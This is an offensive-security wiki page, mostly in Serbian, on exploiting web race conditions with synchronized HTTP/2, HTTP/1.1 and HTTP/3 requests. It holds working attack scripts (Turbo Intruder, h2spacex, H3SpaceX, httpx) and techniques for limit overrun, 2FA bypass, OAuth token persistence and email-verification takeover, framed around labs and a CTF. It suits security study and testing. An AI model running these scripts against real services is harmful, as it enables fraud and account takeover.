# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Za dublje razumevanje ove tehnike pogledajte originalni izveštaj na [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Poboljšavanje Race Condition napada

Glavna prepreka za iskorišćavanje race condition je obezbeđivanje da više zahteva bude obrađeno u isto vreme, sa veoma malom razlikom u vremenima obrade — idealno manje od 1ms.

Ovde možete pronaći neke tehnike za sinhronizaciju zahteva:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Omogućava slanje dva zahteva preko jedne TCP konekcije, čime se smanjuje uticaj mrežnog jittera. Ipak, zbog varijacija na serverskoj strani, dva zahteva možda neće biti dovoljna za konzistentan race condition exploit.
- **HTTP/1.1 'Last-Byte Sync'**: Dozvoljava prethodno slanje većine delova 20–30 zahteva, zadržavajući mali fragment koji se potom pošalje zajedno, postižući istovremeni dolazak na server.

**Preparation for Last-Byte Sync** involves:

1. Slanje header‑a i podataka body‑a umanjeno za poslednji bajt bez zatvaranja stream‑a.
2. Pauza od 100ms nakon inicijalnog slanja.
3. Isključivanje TCP_NODELAY da bi se iskoristio Nagle's algorithm za grupisanje finalnih frame‑ova.
4. Pingovanje da se konekcija "zagreje".

Naknadno slanje zadržanih frame‑ova bi trebalo da rezultira njihovim dolaskom u jednom paketu, što se može verifikovati preko Wireshark‑a. Ova metoda se ne primenjuje na static files, koji obično nisu uključeni u RC attacks.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3 radi preko QUIC (UDP). Ne postoji TCP coalescing ili Nagle na šta bi se oslonili, pa klasični last‑byte sync ne radi sa off‑the‑shelf klijentima. Umesto toga, potrebno je namerno koalescirati više QUIC stream‑final DATA frame‑ova (FIN) u isti UDP datagram tako da server obradi sve ciljne zahteve u istom scheduling tick‑u.
- **How to do it**: Koristite purpose‑built library koja izlaže kontrolu QUIC frame‑ova. Na primer, H3SpaceX manipuliše quic‑go da implementira HTTP/3 last‑frame synchronization za zahteve sa body‑em i GET‑stil zahteve bez body‑a.
- Requests‑with‑body: pošaljite HEADERS + DATA umanjeno za poslednji bajt za N stream‑ova, zatim flush‑ujte poslednji bajt svakog stream‑a zajedno.
- GET‑style: kreirajte lažne DATA frame‑ove (ili mali body sa Content‑Length) i završite sve stream‑ove u jednom datagramu.
- **Practical limits**:
  - Concurrency je ograničen peer‑ovim QUIC max_streams transport parameter‑om (slično HTTP/2‑ovom SETTINGS_MAX_CONCURRENT_STREAMS). Ako je nizak, otvorite više H3 konekcija i rasporedite race preko njih.
  - UDP datagram size i path MTU ograničavaju koliko stream‑final frame‑ova možete koalescirati. Biblioteka može obraditi deljenje u više datagrama ako je potrebno, ali flush u jednom datagramu je najpouzdaniji.
- **Practice**: Postoje javni H2/H3 race labs i primeri exploita koji prate H3SpaceX.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Prilagođavanje arhitekturi servera

Razumevanje arhitekture mete je ključno. Front-end serveri mogu drugačije rutirati zahteve, što utiče na vreme odziva. Preventivno server-side connection warming, kroz nebitne zahteve, može ujednačiti vreme odgovora.

#### Rukovanje zaključavanjem zasnovanim na sesiji

Frameworks like PHP's session handler serijalizuju zahteve po sesiji, što potencijalno može prikriti ranjivosti. Korišćenje različitih session tokena za svaki zahtev može zaobići ovaj problem.

#### Prevazilaženje ograničenja brzine ili resursa

Ako connection warming nije efikasan, izazivanje kašnjenja zbog ograničenja brzine ili resursa web servera namenskim slanjem poplave lažnih zahteva može olakšati single-packet attack tako što će inducirati kašnjenje na strani servera pogodno za race conditions.

## Primeri napada

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: Možete poslati zahtev u **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), možete promeniti u zahtevu vrednost koju želite brute force-ovati za **`%s`** kao u `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` i zatim izabrati **`examples/race-single-packer-attack.py`** iz padajućeg menija:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Ako ćete **slati različite vrednosti**, možete izmeniti kod ovim koji koristi wordlist iz clipboard-a:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Ako web ne podržava HTTP2 (samo HTTP1.1), koristite `Engine.THREADED` ili `Engine.BURP` umesto `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: U slučaju da treba da pošaljete zahtev na 1 endpoint, a zatim više zahteva ka drugim endpoint-ima da biste pokrenuli RCE, možete izmeniti skriptu `race-single-packet-attack.py` ovako:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Takođe je dostupno u **Repeater** preko nove opcije '**Send group in parallel**' u Burp Suite.
- Za **limit-overrun** možete jednostavno dodati **same request 50 times** u grupu.
- Za **connection warming**, možete **add** na **beginning** **group** neke **requests** ka non static delu web servera.
- Za **delaying** procesa **between** obrade **one request and another** u 2 substates koraka, možete **add extra requests between** oba requests.
- Za **multi-endpoint** RC možete početi slati **request** koji **goes to the hidden state** i potom odmah poslati **50 requests** koji **exploits the hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Cilj ovog skripta je da promeni email korisnika dok ga kontinuirano verifikuje sve dok verification token nove email adrese ne stigne na poslednju email adresu (ovo je zato što se u kodu primećivao RC gde je bilo moguće izmeniti email ali poslati verification na staru adresu jer je variable koja označava email već bila popunjena prvom adresom).\
Kada se u primljenim emailovima pronađe reč "objetivo", znamo da smo primili verification token promenjenog emaila i završavamo attack.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: napomene o engine-u i gatingu

- Izbor engine-a: koristi `Engine.BURP2` na HTTP/2 ciljevima da pokrene single‑packet attack; u suprotnom se prebaci na `Engine.THREADED` ili `Engine.BURP` za HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: stavi mnogo kopija u red sa `gate='race1'` (ili per‑attempt gates), što zadržava ostatak svakog zahteva; `openGate('race1')` istovremeno otpušta sve te ostatke tako da stignu skoro istovremeno.
- Dijagnostika: negativni timestampovi u Turbo Intruder ukazuju da je server odgovorio pre nego što je zahtev bio potpuno poslan, što dokazuje preklapanje. To se očekuje kod pravih race uslova.
- Zagrevanje konekcije: pošaljite ping ili nekoliko bezopasnih zahteva prvo da stabilizujete vremenska merenja; po želji onemogućite `TCP_NODELAY` da podstaknete grupisanje finalnih frejmova.


### Improving Single Packet Attack

U originalnom istraživanju objašnjeno je da ovaj napad ima limit od 1.500 bajta. Međutim, u [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), objašnjeno je kako je moguće proširiti 1.500‑bajtno ograničenje single packet attack na **65,535 B window limitation of TCP by using IP layer fragmentation** (razbijanjem jednog paketa na više IP paketa) i slanjem tih fragmenata u drugačijem redosledu, što onemogućava ponovno sastavljanje paketa dok svi fragmenti ne stignu do servera. Ova tehnika je istraživaču omogućila da pošalje 10.000 zahteva za oko 166ms.

Imajte na umu da, iako ovo poboljšanje čini napad pouzdanijim kod RC koji zahteva stotine/načine hiljada paketa da stignu u isto vreme, može postojati i neka softverska ograničenja. Neki popularni HTTP serveri poput Apache, Nginx i Go imaju striktno podešavanje `SETTINGS_MAX_CONCURRENT_STREAMS` na 100, 128 i 250. Međutim, drugi kao što su NodeJS i nghttp2 imaju to neograničeno.\
To u suštini znači da će Apache razmatrati samo 100 HTTP streamova iz jedne TCP konekcije (ograničavajući ovaj RC napad). Za HTTP/3, analogno ograničenje je QUIC’s max_streams transport parameter – ako je mali, raspodelite vaš race preko više QUIC konekcija.

Možete pronaći neke primere koji koriste ovu tehniku u repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Pre prethodnog istraživanja, ovo su bili neki payloadi koji su pokušavali da pošalju pakete što brže kako bi izazvali RC.

- **Repeater:** Pogledajte primere iz prethodnog odeljka.
- **Intruder**: Pošaljite zahtev u **Intruder**, podesite **number of threads** na **30** u **Options menu**, izaberite kao payload **Null payloads** i generišite **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC metodologija**

### Prekoračenje limita / TOCTOU

Ovo je najosnovniji tip race condition-a gde se **ranjivosti** javljaju na mestima koja **ograničavaju broj puta koji možete izvršiti neku akciju**. Na primer, korišćenje istog discount koda u web prodavnici više puta. Vrlo jednostavan primer može se naći u [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ili u [**this bug**](https://hackerone.com/reports/759247)**.**

Postoji mnogo varijacija ovog tipa napada, uključujući:

- Iskorišćavanje gift card-a više puta
- Ocenjivanje proizvoda više puta
- Podizanje ili prenos gotovine više od stanja na nalogu
- Ponovna upotreba jedne CAPTCHA rešenja
- Zaobilaženje anti-brute-force rate limita

### **Skrivena podstanja**

Eksploatisanje kompleksnih race condition-a često podrazumeva iskorišćavanje kratkih prilika za interakciju sa skrivenim ili **neželjenim podstanjima mašine**. Evo kako pristupiti tome:

1. **Identifikujte potencijalna skrivena podstanja**
- Počnite tako što ćete locirati endpoints koji modifikuju ili interaguju sa kritičnim podacima, kao što su user profiles ili password reset processes. Fokusirajte se na:
- **Storage**: Dajte prednost endpoints koji manipulišu server-side persistent data u odnosu na one koji rade sa client-side podacima.
- **Action**: Potražite operacije koje menjaju postojeće data, jer one imaju veću verovatnoću da stvore exploitable conditions u poređenju sa operacijama koje dodaju nove data.
- **Keying**: Uspešni napadi obično uključuju operacije koje koriste isti identifikator, npr. username ili reset token.
2. **Izvedite početno sondiranje**
- Testirajte identifikovane endpoints sa race condition napadima i posmatrajte bilo kakva odstupanja od očekivanih rezultata. Neočekivani odgovori ili promene u ponašanju aplikacije mogu ukazivati na ranjivost.
3. **Demonstrirajte ranjivost**
- Suzite napad na minimalan broj zahteva potreban za eksploataciju ranjivosti, često samo dva. Ovaj korak može zahtevati više pokušaja ili automatizaciju zbog preciznog tajminga.

### Vremenski osetljivi napadi

Preciznost u tajmingu zahteva može otkriti ranjivosti, naročito kada se za sigurnosne tokene koriste predvidivi mehanizmi poput timestamps. Na primer, generisanje password reset tokens na bazi timestamps-a može dovesti do identičnih tokena za simultane zahteve.

**Za eksploataciju:**

- Koristite precizan tajming, npr. single packet attack, da pošaljete simultane password reset requests. Identični tokens ukazuju na ranjivost.

**Primer:**

- Zatražite dva password reset tokens istovremeno i uporedite ih. Poklapanje tokena sugeriše flaw u token generation.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Studije slučaja skrivenih podstanja

### Plati & dodaj stavku

Pogledajte ovaj [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) da vidite kako da **platite** u prodavnici i **dodate dodatnu** stavku za koju **nećete morati da platite**.

### Potvrda drugih email-ova

Ideja je da **verifikujete email adresu i istovremeno je promenite u drugu** kako biste proverili da li platforma verifikuje novu adresu.

### Promena email-a na 2 adrese zasnovano na Cookie-ima

Prema [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab je bio ranjiv na takeover na ovaj način jer bi mogao **send** **email verification token jedne adrese drugoj adresi**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Skrivena stanja baze / Zaobilaženje potvrde

Ako se koriste **2 različita upisa** za **dodavanje** **informacija** u **database**, postoji kratak period u kome je **samo prvi podatak upisan** u bazu. Na primer, prilikom kreiranja korisnika, **username** i **password** mogu biti **upisani**, a tek potom se upisuje **token** za potvrdu novokreiranog naloga. To znači da u tom kratkom trenutku **token za potvrdu naloga može biti null**.

Dakle, registracija naloga i slanje više zahteva sa praznim token-om (`token=` ili `token[]=` ili bilo koja druga varijacija) da bi se odmah potvrdio nalog moglo bi omogućiti **potvrdu naloga** za koji ne kontrolišete email.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Zaobilaženje 2FA

Sledeći pseudokod je ranjiv na race condition zato što u veoma kratkom vremenu **2FA nije primenjen** dok se session kreira:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 večna perzistencija

Postoji nekoliko [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Ove usluge omogućavaju kreiranje aplikacije i autentifikaciju korisnika koje je provajder registrovao. Da bi se to izvršilo, **client** će morati da **dozvoli vašoj aplikaciji** pristup nekim njihovim podacima unutar **OAUth provider**.\
Dakle, do sada je to običan login sa google/linkedin/github... gde vam se prikaže stranica koja kaže: "_Aplikacija <InsertCoolName> želi pristupiti vašim informacijama, da li želite da dozvolite?_"

#### Race Condition in `authorization_code`

Problem se javlja kada ga prihvatite i automatski se pošalje `authorization_code` zlonamernoj aplikaciji. Zatim ta aplikacija zloupotrebljava Race Condition u OAUth provajderu usluga da iz `authorization_code` generiše više AT/RT (Authentication Token/Refresh Token) za vaš nalog. U suštini, zloupotrebiće to što ste dali aplikaciji pristup vašim podacima da kreira nekoliko naloga. Ako potom prestanete da dozvoljavate aplikaciji pristup podacima, jedan par AT/RT će biti obrisan, ali ostali će i dalje biti važeći.

#### Race Condition in `Refresh Token`

Jednom kada dobijete važeći RT, možete pokušati da ga zloupotrebite kako biste generisali nekoliko AT/RT, i čak ako korisnik otkaže dozvole za zlonamernu aplikaciju da pristupa njegovim podacima, nekoliko RT-ova će i dalje ostati važeći.

## **RC in WebSockets**

- U [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) možete naći PoC u Javi za slanje websocket poruka paralelno kako biste zloupotrebili Race Conditions i u Web Sockets.
- Sa Burp’s WebSocket Turbo Intruder možete koristiti **THREADED** engine da pokrenete više WS konekcija i šaljete payloads paralelno. Počnite od zvaničnog primera i podesite `config()` (thread count) za konkurentnost; ovo je često pouzdanije od grupisanja na jednoj konekciji kada se trkate za server‑side stanje kroz WS handlere. Pogledajte [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
